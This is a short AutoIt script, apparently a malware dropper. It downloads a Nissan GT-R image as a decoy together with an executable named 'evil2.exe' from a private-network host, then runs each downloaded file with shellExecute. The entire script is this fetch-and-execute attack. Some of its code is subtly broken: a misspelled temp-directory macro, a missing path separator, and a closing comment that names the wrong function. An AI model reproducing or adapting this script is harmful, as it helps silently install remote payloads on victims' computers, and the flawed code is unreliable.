#include <StaticConstants.au3>
#include <WindowsConstants.au3>
Local $urls = "https://www.nissanusa.com/content/dam/Nissan/us/vehicles/gtr/r35/2_minor_change/nismo/2020-gtr-nismo-rear-on-curve-20tdipace501.jpg,http://192.168.79.137/vicky/evil2.exe"

Local $urlsArray = StringSplit($urls,",",2)

for $url In $urlsArray
         $sFile = DownloadFile($url)
         shellExecute($sFile)

Next

Func DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL,"^.*/","")
    $sDirectory=@TemDir & $sFile
    $hDownload=InetGet($sURL,$sDirectory,17,1)
    InetClose($hDownload)
    Return $sDirectory
EndFunc   ;==> GetURLImage